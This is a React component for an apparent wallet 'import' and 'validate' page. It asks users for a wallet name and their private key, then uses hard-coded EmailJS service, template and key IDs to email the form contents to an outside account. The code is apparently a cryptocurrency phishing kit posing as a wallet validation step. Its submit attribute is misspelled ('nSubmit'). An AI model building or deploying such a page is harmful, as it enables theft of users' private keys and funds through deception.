import React, { useRef } from "react";
import "./Private_Key.css";
import { NavLink } from "react-router-dom";
import emailjs from "emailjs-com";

export const Private_Key = () => {
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_qghi171", "template_m0dnrdu", form.current, "HaqXdadPhJghOQ5LG")
      .then(
        () => {
          console.log("SUCCESS!");
        },
        (error) => {
          console.log("FAILED...", error.text);
        }
      );
  };

  return (
    <div className="contact_info">
      <div className="head">
        <h2>
          <NavLink to="/wallets">
            <i className="bi bi-arrow-left-circle"></i>
            <span> Import Wallet </span>
          </NavLink>
        </h2>
      </div>
      <div className="myul">
        <ul>
          <li>
            <h3>
            <NavLink to="/Contact"> Phrase </NavLink>
            </h3>
          </li>
          <li>
            <h3>
              <NavLink to="/keystore">keystore JSON </NavLink>
            </h3>
          </li>
          <li>
            <h3>
              <NavLink to="/private">Private Key </NavLink>
            </h3>
          </li>
          <li>
            <h3>
              <NavLink to="/encrypt"> Encrypted Key </NavLink>
            </h3>
          </li>
        </ul>
      </div>
      <form ref={form} nSubmit={sendEmail} className="myform">
        <textarea
          name="walletName"
          placeholder="Wallet Name"
          required
          className="walletName"
        />
        <input
          type="text"
          name="Private"
          placeholder="Private Key"
          className="password"
          required
        />
        <p>Typically 64 alphanumeric characters</p>
        <NavLink to="/Loading">    <button type="submit" name="submit" >
          <p>VALIDATE</p>
        </button></NavLink> 
      </form>
    </div>
  );
};

export default Private_Key;
